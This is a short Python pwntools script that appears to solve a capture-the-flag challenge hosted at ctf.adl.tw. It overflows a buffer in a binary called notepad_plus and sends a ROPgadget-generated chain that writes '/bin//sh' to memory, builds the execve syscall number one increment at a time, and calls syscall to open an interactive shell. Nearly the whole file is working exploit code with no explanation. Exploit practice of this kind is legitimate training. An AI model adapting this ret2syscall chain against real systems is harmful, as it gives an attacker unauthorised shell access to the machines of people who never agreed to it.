from pwn import *
from struct import pack

print(cyclic(1000))

ip = 'ctf.adl.tw'
port = 11004
r = remote(ip, port)

p = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"

# ROPgadget --ropchain --binary notepad_plus > log

p += pack('<Q', 0x00000000004124d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x000000000044cccc) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f511) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004124d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000443ab5) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f511) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004124d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x000000000044cd25) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000443ab5) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040142c) # syscall

r.sendline(p)
r.interactive()